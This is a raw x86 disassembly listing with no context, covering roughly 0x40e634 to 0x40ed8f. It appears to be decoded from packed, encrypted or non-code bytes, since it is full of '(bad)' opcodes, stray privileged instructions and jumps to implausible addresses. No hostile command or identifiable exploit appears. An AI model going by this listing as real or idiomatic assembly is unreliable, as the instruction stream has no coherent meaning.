  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
